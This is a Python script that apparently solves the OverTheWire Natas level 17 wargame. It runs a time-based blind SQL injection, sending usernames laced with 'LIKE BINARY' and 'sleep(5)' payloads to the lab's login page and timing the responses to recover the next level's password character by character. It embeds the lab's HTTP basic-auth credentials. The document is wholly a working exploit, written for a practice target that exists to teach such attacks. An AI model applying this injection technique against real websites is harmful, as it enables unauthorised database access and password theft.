import requests
from requests.auth import HTTPBasicAuth
from time import *

allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in allchars:
    start=(time())
    Data = {'username' : 'natas18" and password LIKE BINARY "%' + char + '%" and sleep(5)#'}
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data = Data)
    end=(time())
    if ((end-start)>5):
        filtered = filtered + char
        print(filtered)

for i in range(0,32):
    for char in filtered:
        start=(time())
        Data = {'username' : 'natas18" and password LIKE BINARY "' + passwd + char + '%" and sleep(5)#'}
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data = Data)
        end=(time())
        if ((end-start)>5):
            passwd = passwd + char
            print(passwd)
            break



